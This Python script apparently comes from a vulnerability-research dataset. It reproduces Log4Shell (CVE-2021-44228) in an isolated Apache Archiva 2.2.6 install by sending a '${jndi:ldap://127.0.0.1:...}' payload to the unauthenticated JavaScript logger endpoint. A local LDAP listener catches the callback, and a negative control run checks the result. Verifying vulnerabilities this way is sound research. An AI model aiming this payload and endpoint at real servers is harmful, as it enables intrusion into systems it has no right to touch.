#!/usr/bin/env python3
import argparse
import hashlib
import http.client
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_archiva_2_2_6_v1_log4j_real_entrypoint"
DOWNSTREAM = "Apache Archiva 2.2.6"
ARCHIVE_NAME = "apache-archiva-2.2.6-bin.tar.gz"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
BASE = ROOT / "samples" / SAMPLE_ID / "evidence"
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
JAVA = "/data/lhq/.sdkman/candidates/java/8.0.452-amzn/bin/java"
LDAP_BIND_RESPONSE = bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0])

LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
    "log4j-slf4j-impl-2.14.1.jar": LOG4J_CACHE / "log4j-slf4j-impl-2.14.1.jar",
    "log4j-jcl-2.14.1.jar": LOG4J_CACHE / "log4j-jcl-2.14.1.jar",
    "log4j-1.2-api-2.14.1.jar": LOG4J_CACHE / "log4j-1.2-api-2.14.1.jar",
}

V1_RUNTIME_JARS = {"log4j-api-2.14.1.jar", "log4j-core-2.14.1.jar"}


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def start_ldap(case_name, timeout=90):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (BASE / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(LDAP_BIND_RESPONSE)
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"LDAP listener did not start for {case_name}")
    return port_box["port"], received, thread


def replace_log4j(dist):
    lib = dist / "apps" / "archiva" / "WEB-INF" / "lib"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        artifact = target_name.rsplit("-", 1)[0]
        for old in lib.glob(f"{artifact}-*.jar"):
            old.unlink()
        target = lib / target_name
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_JARS,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {"before": before, "copied": copied, "after": after}


def prep_runtime(case_name):
    run_root = BASE / f"{case_name}-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(run_root)
    dist = run_root / "apache-archiva-2.2.6"
    for script in (dist / "bin").glob("*"):
        script.chmod(script.stat().st_mode | 0o111)
    replacement = replace_log4j(dist)
    return dist, replacement


def http_json(port, method, path, body_obj):
    body = json.dumps(body_obj).encode("utf-8")
    headers = {
        "Host": f"127.0.0.1:{port}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Content-Length": str(len(body)),
    }
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=8)
    try:
        conn.request(method, path, body, headers)
        resp = conn.getresponse()
        text = resp.read(4000).decode("utf-8", "replace")
        return {"status": resp.status, "reason": resp.reason, "body_prefix": text[:1200]}
    except Exception as exc:
        return {"error": repr(exc)}
    finally:
        conn.close()


def http_get(port, path="/"):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    try:
        conn.request("GET", path, headers={"Host": f"127.0.0.1:{port}"})
        resp = conn.getresponse()
        text = resp.read(1000).decode("utf-8", "replace")
        return {"status": resp.status, "reason": resp.reason, "body_prefix": text[:500]}
    except Exception as exc:
        return {"error": repr(exc)}
    finally:
        conn.close()


def wait_ready(port, proc, timeout=120):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        last = http_get(port, "/")
        if last.get("status") in (200, 302, 401, 403):
            return True, last
        time.sleep(1)
    return False, last


def stop_process(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=15)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=5)
        except Exception:
            pass


def run_case(case_name, message):
    dist, replacement = prep_runtime(case_name)
    http_port = free_port()
    stdout_path = BASE / f"{case_name}-archiva-console.log"
    cmd = [
        JAVA if Path(JAVA).exists() else "java",
        "-Dappserver.home=.",
        "-Dappserver.base=.",
        "-Djetty.logs=./logs",
        "-Djava.io.tmpdir=./temp",
        "-DAsyncLoggerConfig.WaitStrategy=Block",
        "-Darchiva.repositorySessionFactory.id=jcr",
        "-Darchiva.cassandra.configuration.file=./conf/archiva-cassandra.properties",
        "-Djetty.host=127.0.0.1",
        f"-Djetty.port={http_port}",
        "-Dlog4j2.formatMsgNoLookups=false",
        "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
        "-cp",
        "lib/*",
        "org.eclipse.jetty.start.Main",
        "conf/jetty.xml",
    ]
    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = ""
    with stdout_path.open("w", encoding="utf-8") as stdout:
        proc = subprocess.Popen(
            cmd,
            cwd=str(dist),
            env=env,
            stdout=stdout,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
    result = {
        "case": case_name,
        "dist": str(dist),
        "http_port": http_port,
        "value": message,
        "replacement": replacement,
        "ready": False,
    }
    try:
        ready, ready_response = wait_ready(http_port, proc)
        result["ready"] = ready
        result["ready_response"] = ready_response
        attempts = []
        if ready:
            body = {"loggerName": "org.apache.archiva.web.api.DefaultJavascriptLogger", "message": message}
            paths = [
                "/restServices/archivaUiServices/javascriptLogger/info",
                "/restServices/archivaServices/javascriptLogger/info",
                "/restServices/javascriptLogger/info",
            ]
            for path in paths:
                resp = http_json(http_port, "PUT", path, body)
                resp["path"] = path
                attempts.append(resp)
                if resp.get("status") in (200, 204):
                    break
            time.sleep(6)
        result["put_attempts"] = attempts
    finally:
        stop_process(proc)
        result["returncode"] = proc.poll()
    console = stdout_path.read_text(encoding="utf-8", errors="replace")
    archiva_logs = {}
    for path in sorted((dist / "logs").glob("*.log")):
        text = path.read_text(encoding="utf-8", errors="replace")
        archiva_logs[str(path.relative_to(dist))] = {
            "contains_value": message in text,
            "contains_jslogger": "DefaultJavascriptLogger" in text or "javascriptLogger" in text,
            "tail": text[-8000:],
        }
    result["console"] = {
        "file": str(stdout_path),
        "contains_value": message in console,
        "tail": console[-8000:],
    }
    result["logs"] = archiva_logs
    return result


def dependency_evidence(positive, negative):
    core = LOG4J_JARS["log4j-core-2.14.1.jar"]
    api = LOG4J_JARS["log4j-api-2.14.1.jar"]
    jndi_lookup = False
    jndi_manager = False
    pom = ""
    if core.exists():
        with zipfile.ZipFile(core) as zf:
            names = set(zf.namelist())
            jndi_lookup = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
            jndi_manager = "org/apache/logging/log4j/core/net/JndiManager.class" in names
            pom = zf.read("META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties").decode("utf-8", "replace")
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Archiva 2.2.6 binary with "
            "generated v1 Log4j 2.14.1 api/core jars copied from .m2-poc into "
            "apps/archiva/WEB-INF/lib, plus auxiliary Log4j bridge jars copied from the legacy cache"
        ),
        "inserted_log4j_api": {
            "path": str(api),
            "sha256": sha256(api) if api.exists() else None,
            "is_generated_v1_runtime_jar": True,
        },
        "inserted_log4j_core": {
            "path": str(core),
            "sha256": sha256(core) if core.exists() else None,
            "is_generated_v1_runtime_jar": True,
        },
        "positive_runtime_replacement": positive["replacement"],
        "negative_runtime_replacement": negative["replacement"],
        "log4j_core_version_2_14_1": "version=2.14.1" in pom,
        "jndi_lookup_class_present": jndi_lookup,
        "jndi_manager_class_present": jndi_manager,
        "real_downstream_entrypoint": "PUT /restServices/archivaUiServices/javascriptLogger/info with JSON JavascriptLog.message",
        "entrypoint_evidence": "JavascriptLogger has @Path('/javascriptLogger/'), method info has @PUT/@Path('info') and @RedbackAuthorization(noRestriction=true,noPermission=true); DefaultJavascriptLogger.info logs JavascriptLog.message via SLF4J.",
    }
    (BASE / "dependency-evidence.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def any_log_contains(case_result, key):
    return any(item.get(key) for item in case_result.get("logs", {}).values())


def successful_put(case_result):
    return any(a.get("status") in (200, 204) for a in case_result.get("put_attempts", []))


def summarize(result):
    positive = result["positive"]
    negative = result["negative"]
    dep = result["dependency_evidence"]
    return {
        "positive_ready": positive["ready"],
        "positive_put_success": successful_put(positive),
        "positive_payload_logged": any_log_contains(positive, "contains_value") or positive["console"]["contains_value"],
        "positive_listener_received_count": positive["listener_received_count"],
        "positive_listener_received": positive["listener_received"],
        "negative_ready": negative["ready"],
        "negative_put_success": successful_put(negative),
        "negative_control_logged": any_log_contains(negative, "contains_value") or negative["console"]["contains_value"],
        "negative_listener_received_count": negative["listener_received_count"],
        "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
        "jndi_manager_class_present": dep["jndi_manager_class_present"],
        "log4j_core_version_2_14_1": dep["log4j_core_version_2_14_1"],
        "generated_v1_jars_inserted": all(
            name in positive["replacement"]["copied"]
            and positive["replacement"]["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_JARS
        ),
    }


def write_run_rc(exit_code, result):
    signal = result["dynamic_signal"]
    lines = [f"RUN_RC={exit_code}", f"status={result['strict_status']}"]
    for key, value in signal.items():
        if key == "positive_listener_received":
            continue
        lines.append(f"{key}={value}")
    received = signal.get("positive_listener_received") or []
    if received:
        lines.append(f"listener_data_hex={received[0].get('data_hex')}")
    (BASE / "run.rc").write_text("\n".join(lines) + "\n", encoding="utf-8")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    parser.add_argument("--evidence-dir")
    return parser.parse_args()


def main():
    global ROOT, BASE
    args = parse_args()
    ROOT = Path(args.workdir)
    BASE = Path(args.evidence_dir) if args.evidence_dir else ROOT / "samples" / SAMPLE_ID / "evidence"
    sample_dir = ROOT / "samples" / SAMPLE_ID
    if args.fresh and BASE.exists():
        shutil.rmtree(BASE)
    BASE.mkdir(parents=True, exist_ok=True)

    ldap_port, received, thread = start_ldap("positive")
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % ldap_port
    positive = run_case("positive", payload)
    thread.join(2)
    positive["listener_received"] = received
    positive["listener_received_count"] = len(received)

    _, negative_received, negative_thread = start_ldap("negative", timeout=35)
    negative = run_case("negative", "strict_control_no_jndi")
    negative_thread.join(1)
    negative["listener_received"] = negative_received
    negative["listener_received_count"] = len(negative_received)

    dep = dependency_evidence(positive, negative)
    confirmed = (
        ARCHIVE.exists()
        and dep["log4j_core_version_2_14_1"]
        and dep["jndi_lookup_class_present"]
        and dep["jndi_manager_class_present"]
        and positive["ready"]
        and successful_put(positive)
        and (any_log_contains(positive, "contains_value") or positive["console"]["contains_value"])
        and positive["listener_received_count"] > 0
        and negative["ready"]
        and successful_put(negative)
        and (any_log_contains(negative, "contains_value") or negative["console"]["contains_value"])
        and negative["listener_received_count"] == 0
        and all(
            name in positive["replacement"]["copied"]
            and positive["replacement"]["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_JARS
        )
    )
    signal = summarize({"positive": positive, "negative": negative, "dependency_evidence": dep})
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/archiva",
        "downstream_application": DOWNSTREAM,
        "downstream_entrypoint": "Archiva real Jetty webapp REST JavaScript logger endpoint",
        "downstream": DOWNSTREAM,
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "insertion_model": dep["insertion_model"],
        "attack_surface": "Archiva unauthenticated REST JavaScript logger endpoint",
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j "
            "api/core 2.14.1 runtime jars into an isolated Archiva distribution and triggers "
            "Log4Shell through Archiva's real unauthenticated JavaScriptLogger REST endpoint."
        ),
        "positive": {
            "ready": positive["ready"],
            "put_success": successful_put(positive),
            "payload_logged": any_log_contains(positive, "contains_value") or positive["console"]["contains_value"],
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative": {
            "ready": negative["ready"],
            "put_success": successful_put(negative),
            "control_logged": any_log_contains(negative, "contains_value") or negative["console"]["contains_value"],
            "listener_received_count": negative["listener_received_count"],
        },
        "dependency_evidence": dep,
        "dependency_evidence_file": str(BASE / "dependency-evidence.json"),
        "dynamic_evidence": str(BASE / "probe.json"),
        "run_rc": str(BASE / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_archiva_log4j_v1_inserted.py"),
        "cases": [positive, negative],
        "dynamic_signal": signal,
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    for name in ("probe.json", "run.log", "smoke-result.json"):
        (BASE / name).write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Archiva 2.2.6 "
        "binary into an isolated runtime, copies generated v1 Log4j 2.14.1 `api` and `core` jars "
        "from `.m2-poc` into `apps/archiva/WEB-INF/lib`, and adds auxiliary Log4j bridge jars so "
        "Archiva's own SLF4J/JCL logging path resolves to Log4j2.\n\n"
        "The positive run starts Archiva's real Jetty webapp and sends `PUT "
        "/restServices/archivaUiServices/javascriptLogger/info` with a JSON `message` of "
        "`${jndi:ldap://127.0.0.1:<port>/a}`. `DefaultJavascriptLogger.info` logs that message, "
        "and the local LDAP listener must receive the Log4j JNDI lookup. The negative run uses "
        "the same endpoint with a non-JNDI control message and must receive no callback.\n\n"
        "Run: `python3 scripts/verify_archiva_log4j_v1_inserted.py` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    exit_code = 0 if confirmed else 1
    write_run_rc(exit_code, result)
    print(json.dumps({
        "status": result["status"],
        "strict_status": result["strict_status"],
        "base": str(BASE),
        "positive_ready": positive["ready"],
        "positive_put_success": successful_put(positive),
        "positive_listener_received_count": positive["listener_received_count"],
        "positive_payload_logged": result["dynamic_signal"]["positive_payload_logged"],
        "negative_ready": negative["ready"],
        "negative_put_success": successful_put(negative),
        "negative_listener_received_count": negative["listener_received_count"],
        "negative_control_logged": result["dynamic_signal"]["negative_control_logged"],
    }, indent=2, sort_keys=True))
    raise SystemExit(exit_code)


if __name__ == "__main__":
    main()
